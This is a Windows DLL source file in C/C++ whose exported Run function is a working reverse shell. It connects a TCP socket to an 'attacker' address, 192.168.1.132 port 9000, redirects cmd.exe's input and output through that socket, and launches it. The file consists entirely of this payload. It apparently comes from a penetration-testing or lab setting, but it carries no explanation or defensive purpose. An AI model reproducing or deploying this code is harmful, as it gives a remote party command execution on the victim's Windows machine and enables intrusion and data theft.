
#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
#include <windows.h>
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <stdio.h>
#include <cstdlib>

#define EXPORT __declspec(dllexport)

#pragma comment(lib, "ws2_32.lib")

WSADATA wsadata;
SOCKET Winsock;
struct sockaddr_in attacker;
char aip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;

#ifdef __cplusplus
extern "C"
{
#endif

EXPORT void Run(void)
{
	
	int err;

	err = WSAStartup(MAKEWORD(2, 2), &wsadata);
	if (err != 0)
		exit(1);

	Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	attacker.sin_family = AF_INET;
	attacker.sin_port = htons(9000);
	attacker.sin_addr.s_addr = inet_addr("192.168.1.132");

	WSAConnect(Winsock, (SOCKADDR*)&attacker, sizeof(attacker), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)Winsock;

	TCHAR command[256] = L"cmd.exe";
	CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);

}

#ifdef __cplusplus
}
#endif

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)

{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

